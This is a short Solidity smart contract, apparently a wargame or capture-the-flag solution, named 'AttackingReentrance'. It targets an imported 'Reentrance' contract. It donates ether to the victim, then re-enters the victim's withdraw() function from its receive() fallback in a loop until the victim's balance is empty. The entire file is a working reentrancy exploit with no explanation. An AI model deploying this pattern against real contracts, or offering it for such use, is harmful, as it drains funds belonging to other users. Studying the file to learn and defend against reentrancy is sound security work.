// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance public victimContract;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        victimContract = Reentrance(_contractAddress);
    }

    function hackContract() external {
        victimContract.donate{value: address(this).balance}(address(this));
        yoinkDonation();
    }

    function yoinkDonation() private {
        if (contractAddress.balance == 0) {
            return;
        }

        victimContract.withdraw();
    }

    receive() external payable {
        yoinkDonation();
    }
}
